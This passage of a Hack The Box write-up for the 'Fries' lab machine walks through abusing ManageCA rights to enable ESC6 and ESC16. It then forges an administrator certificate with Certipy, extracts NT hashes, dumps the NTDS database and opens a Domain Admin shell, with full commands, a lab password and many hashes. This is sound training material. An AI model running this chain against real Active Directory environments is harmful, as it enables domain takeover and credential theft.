+[+] Domain: &#39;FRIES.HTB&#39;
+[+] Username: &#39;GMSA_CA_PROD$&#39;
+[+] Trying to resolve &#39;dc01.fries.htb&#39; at &#39;10.129.244.72&#39;
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:10.129.244.72[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:10.129.244.72[\pipe\cert]
+[*] Request ID is 45
+[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
+Would you like to save the private key? (y/N): y
+[*] Saving private key to &#39;45.key&#39;
+[+] Attempting to write data to &#39;45.key&#39;
+[+] Data written to &#39;45.key&#39;
+[*] Wrote private key to &#39;45.key&#39;
+[-] Failed to request certificate</code></pre><p>Ill then submit a request and retrieve the key</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">certipy-ad ca  -u &#39;gMSA_CA_prod$@fries.htb&#39; -hashes &#39;:1be70aa7a632cd28036169c6038a92a5&#39; -ca fries-DC01-CA -target 10.129.244.72 -issue-request 45 -dc-ip 10.129.244.72 -dc-host dc01.fries.htb -debug
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[+] Nameserver: &#39;10.129.244.72&#39;
+[+] DC IP: &#39;10.129.244.72&#39;
+[+] DC Host: &#39;dc01.fries.htb&#39;
+[+] Target IP: &#39;10.129.244.72&#39;
+[+] Remote Name: &#39;10.129.244.72&#39;
+[+] Domain: &#39;FRIES.HTB&#39;
+[+] Username: &#39;GMSA_CA_PROD$&#39;
+[+] Trying to get DCOM connection for: &#39;10.129.244.72&#39;
+[-] Access denied: Insufficient permissions to issue certificate</code></pre><p>But i am getting an error, im still not sure on the exact reason, but its clear its not just as simple as exploiting ESC7</p><p>However, since i have ManageCa i might be able to modify ADCS in some way</p><p>I also have access over WINRM, so i should be able to directly interact with the certsvc service</p><h3>Using ManageCa privileges to enable ESC6 and ESC16</h3><p>So i cant abuse ESC7 in the normal way, but i still have ManageCa which means i can make changes to ADCS</p><p><a href="https://bloodhound.specterops.io/resources/edges/manage-ca#4-enable-esc6-flag-editf_attributesubjectaltname2" target="_blank" rel="noreferrer">https://bloodhound.specterops.io/resources/edges/manage-ca#4-enable-esc6-flag-editf_attributesubjectaltname2</a></p><p><a href="https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Certify.exe" target="_blank" rel="noreferrer">https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Certify.exe</a></p><p>Ill upload it to WINRM</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents&gt; .\Certify.exe manage-ca --ca &quot;DC01.fries.htb\fries-DC01-CA&quot; --esc6
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ &#39;__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Manage a certificate authority
+
+[*] Attempting to toggle EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC6) on the CA.
+[*] The EDITF_ATTRIBUTESUBJECTALTNAME2 flag is not set, toggling it on.
+[*] Successfully set the EditFlags configuration on the CA.
+
+[*] Attempting to restart the CA service.
+[*] Successfully stopped the CA service.
+[*] Successfully restarted the CA service.
+
+Certify completed in 00:00:00.6022747</code></pre><p>Now the flag has been set</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents&gt; Restart-Service certsvc -Force</code></pre><p>Ill restart the certsvc service</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">    [!] Vulnerabilities
+      ESC6                              : Enrollee can specify SAN.
+      ESC7                              : User has dangerous permissions.
+    [*] Remarks
+      ESC6                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.</code></pre><p>And now re running certipy i see that its now vulnerable to ESC6</p><p>However i still cannot get this to work, after some research modern AD networks require you to enable both esc6 and esc16</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents&gt; .\Certify.exe manage-ca --ca &quot;DC01.fries.htb\fries-DC01-CA&quot; --esc16
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ &#39;__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Manage a certificate authority
+
+[*] Attempting to toggle EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC6) on the CA.
+[*] The EDITF_ATTRIBUTESUBJECTALTNAME2 flag is not set, toggling it on.
+[*] Successfully set the EditFlags configuration on the CA.
+
+[*] Attempting to toggle szOID_NTDS_CA_SECURITY_EXT in the DisableExtensionList attribute (ESC16) on the CA.
+[*] The szOID_NTDS_CA_SECURITY_EXT extension does not exist in DisableExtensionList, adding it.
+[*] Successfully set the DisableExtensionList configuration on the CA.
+
+[*] Attempting to restart the CA service.
+[*] Successfully stopped the CA service.
+[*] Successfully restarted the CA service.
+
+Certify completed in 00:00:00.6050693
+*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents&gt;</code></pre><p>Now that is enabled</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">    [!] Vulnerabilities
+      ESC6                              : Enrollee can specify SAN.
+      ESC7                              : User has dangerous permissions.
+      ESC16                             : Security Extension is disabled.
+    [*] Remarks
+      ESC6                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
+      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.</code></pre><p>Now its all setup</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">certipy-ad req -u &#39;svc_infra@fries.htb&#39; -p &#39;m6tneOMAh5p0wQ0d&#39; -target dc01.fries.htb -dc-ip 10.129.244.72 -dc-host dc01.fries.htb -target-ip 10.129.244.72 -ca &#39;fries-DC01-CA&#39; -template &#39;User&#39; -upn &#39;administrator@fries.htb&#39; -sid &#39;S-1-5-21-858338346-3861030516-3975240472-500&#39; -debug
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[+] Nameserver: &#39;10.129.244.72&#39;
+[+] DC IP: &#39;10.129.244.72&#39;
+[+] DC Host: &#39;dc01.fries.htb&#39;
+[+] Target IP: &#39;10.129.244.72&#39;
+[+] Remote Name: &#39;dc01.fries.htb&#39;
+[+] Domain: &#39;FRIES.HTB&#39;
+[+] Username: &#39;SVC_INFRA&#39;
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:10.129.244.72[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:10.129.244.72[\pipe\cert]
+[*] Request ID is 47
+[*] Successfully requested certificate
+[*] Got certificate with UPN &#39;administrator@fries.htb&#39;
+[+] Found SID in SAN URL: &#39;S-1-5-21-858338346-3861030516-3975240472-500&#39;
+[*] Certificate object SID is &#39;S-1-5-21-858338346-3861030516-3975240472-500&#39;
+[*] Saving certificate and private key to &#39;administrator.pfx&#39;
+[+] Attempting to write data to &#39;administrator.pfx&#39;
+[+] Data written to &#39;administrator.pfx&#39;
+[*] Wrote certificate and private key to &#39;administrator.pfx&#39;</code></pre><p>Now ill use thiis certificate to extract the NTLM</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">faketime -f +7h certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.244.72 -debug
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[+] Target name (-target) and DC host (-dc-host) not specified. Using domain &#39;&#39; as target name. This might fail for cross-realm operations
+[+] Nameserver: &#39;10.129.244.72&#39;
+[+] DC IP: &#39;10.129.244.72&#39;
+[+] DC Host: &#39;&#39;
+[+] Target IP: &#39;10.129.244.72&#39;
+[+] Remote Name: &#39;10.129.244.72&#39;
+[+] Domain: &#39;&#39;
+[+] Username: &#39;&#39;
+[*] Certificate identities:
+[*]     SAN UPN: &#39;administrator@fries.htb&#39;
+[*]     SAN URL SID: &#39;S-1-5-21-858338346-3861030516-3975240472-500&#39;
+[+] Found SID in SAN URL: &#39;S-1-5-21-858338346-3861030516-3975240472-500&#39;
+[*] Using principal: &#39;administrator@fries.htb&#39;
+[*] Trying to get TGT...
+[+] Sending AS-REQ to KDC fries.htb (10.129.244.72)
+[*] Got TGT
+[*] Saving credential cache to &#39;administrator.ccache&#39;
+[+] Attempting to write data to &#39;administrator.ccache&#39;
+[+] Data written to &#39;administrator.ccache&#39;
+[*] Wrote credential cache to &#39;administrator.ccache&#39;
+[*] Trying to retrieve NT hash for &#39;administrator&#39;
+[*] Got hash for &#39;administrator@fries.htb&#39;: aad3b435b51404eeaad3b435b51404ee:a773cb05d79273299a684a23ede56748</code></pre><p>Now i have the NTLM hash for the user</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.fries.htb -u Administrator -H &#39;a773cb05d79273299a684a23ede56748&#39; --ntds
+SMB         10.129.244.72   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.244.72   445    DC01             [+] fries.htb\Administrator:a773cb05d79273299a684a23ede56748 (Pwn3d!)
+SMB         10.129.244.72   445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         10.129.244.72   445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:a773cb05d79273299a684a23ede56748:::
+SMB         10.129.244.72   445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.129.244.72   445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ce86e3842ffc9a775d2a356c60eac9c3:::
+SMB         10.129.244.72   445    DC01             fries.htb\w.earl:2613:aad3b435b51404eeaad3b435b51404ee:ee2e704309cf4a26a4686a9d56489bf4:::
+SMB         10.129.244.72   445    DC01             fries.htb\d.cooper:2614:aad3b435b51404eeaad3b435b51404ee:50232f4444bc8fd6cfda4b3e1b715663:::
+SMB         10.129.244.72   445    DC01             fries.htb\b.horne:2615:aad3b435b51404eeaad3b435b51404ee:9cead10842a333fa049d4bc65cc55865:::
+SMB         10.129.244.72   445    DC01             fries.htb\b.briggs:2616:aad3b435b51404eeaad3b435b51404ee:cf1ec47b3cf4e869d5c8b7138c07bae4:::
+SMB         10.129.244.72   445    DC01             fries.htb\s.johnson:2617:aad3b435b51404eeaad3b435b51404ee:6e34ce1188061a026b8fb680d4a0ec9e:::
+SMB         10.129.244.72   445    DC01             fries.htb\j.hurley:2618:aad3b435b51404eeaad3b435b51404ee:e3fa3f2a91ee7f8451fd1d0338e65355:::
+SMB         10.129.244.72   445    DC01             fries.htb\h.truman:2619:aad3b435b51404eeaad3b435b51404ee:f9ac987d61cb1cf5649f82bc52778c3e:::
+SMB         10.129.244.72   445    DC01             fries.htb\d.lynch:2620:aad3b435b51404eeaad3b435b51404ee:327641bc7f835d4be5f7dd5e602e8df4:::
+SMB         10.129.244.72   445    DC01             fries.htb\l.palmer:2621:aad3b435b51404eeaad3b435b51404ee:1d44c7eb22b8c76b072f83fb07a56af3:::
+SMB         10.129.244.72   445    DC01             fries.htb\l.johnson:2622:aad3b435b51404eeaad3b435b51404ee:a191c320a175dbe32cba7c58ede45ec7:::
+SMB         10.129.244.72   445    DC01             fries.htb\h.jennings:2623:aad3b435b51404eeaad3b435b51404ee:b36354d4de8b39c31e13c950e969fbab:::
+SMB         10.129.244.72   445    DC01             fries.htb\svc_infra:3601:aad3b435b51404eeaad3b435b51404ee:3bf3a1986ea9ae5b54a5725847a2adcc:::
+SMB         10.129.244.72   445    DC01             fries.htb\d.wilson:5601:aad3b435b51404eeaad3b435b51404ee:b97330f3044941930b3667fa9888d5e3:::
+SMB         10.129.244.72   445    DC01             fries.htb\m.hannigan:5602:aad3b435b51404eeaad3b435b51404ee:e2c1ce7011b7564d594367b06ca2428c:::
+SMB         10.129.244.72   445    DC01             DC01$:1000:aad3b435b51404eeaad3b435b51404ee:ba380858b63611eaadb906e8e5b55e3e:::
+SMB         10.129.244.72   445    DC01             gMSA_CA_prod$:1104:aad3b435b51404eeaad3b435b51404ee:1be70aa7a632cd28036169c6038a92a5:::
+SMB         10.129.244.72   445    DC01             FRIES.HTB\WEB$:4601:aad3b435b51404eeaad3b435b51404ee:61e3599900d7a81c373bcbaaa755bdb2:::
+SMB         10.129.244.72   445    DC01             [+] Dumped 20 NTDS hashes to /home/kali/.nxc/logs/ntds/DC01_10.129.244.72_2026-08-19_181453.ntds of which 17 were added to the database
+SMB         10.129.244.72   445    DC01             [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         10.129.244.72   445    DC01             [*] grep -iv disabled /home/kali/.nxc/logs/ntds/DC01_10.129.244.72_2026-08-19_181453.ntds | cut -d &#39;:&#39; -f1</code></pre><p>Full domain compromise</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm -i dc01.fries.htb -u Administrator -H &#39;a773cb05d79273299a684a23ede56748&#39;
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</code></pre><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt;</code></pre><p>Domain Admin!</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-darkzero/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">DarkZero</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-absolute/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">Absolute</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
